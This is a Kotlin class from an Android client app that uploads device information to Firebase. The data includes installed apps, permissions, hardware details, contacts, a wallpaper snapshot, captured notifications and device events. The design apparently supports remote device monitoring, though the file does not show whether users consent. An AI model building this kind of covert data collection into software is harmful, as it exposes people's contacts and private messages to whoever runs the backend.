package com.xeg911.appclient.data.remote.channel.firebase

import com.xeg911.appclient.data.remote.firebase.DeviceFirebaseDataSource
import com.xeg911.shared.data.model.CapturedNotification
import com.xeg911.shared.data.model.DeviceRegistration
import com.xeg911.shared.data.model.event.DeviceEvent
import com.xeg911.shared.data.remote.channel.RemoteChannel
import com.xeg911.shared.data.remote.channel.RemoteChannelIds
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FirebaseRemoteChannel @Inject constructor(
    private val dataSource: DeviceFirebaseDataSource,
) : RemoteChannel {

    override val channelId: String = RemoteChannelIds.FIREBASE

    override suspend fun isEnabled(): Boolean = true

    override suspend fun registerDevice(registration: DeviceRegistration): Result<Unit> =
        runCatching {
            val deviceId = registration.deviceInfo.deviceId
            with(dataSource) {
                writeInfo(deviceId, registration.deviceInfo)
                writeApps(deviceId, registration.installedApps)
                writePermissions(
                    deviceId,
                    registration.permissions,
                    registration.missingRequiredPermissions
                )
                writeBattery(deviceId, registration.batteryInfo)
                writeHardware(deviceId, registration.hardwareInfo)
                registration.contacts?.let { writeContacts(deviceId, it) }
                registration.wallpaperSnapshot?.let { writeWallpaper(deviceId, it) }
            }
        }

    override suspend fun sendNotification(notification: CapturedNotification): Result<Unit> =
        runCatching { dataSource.writeNotification(notification) }

    override suspend fun sendEvent(event: DeviceEvent): Result<Unit> = runCatching {
        require(event.deviceId.isNotBlank()) { "event without deviceId" }
        dataSource.pushEvent(event)
    }
}
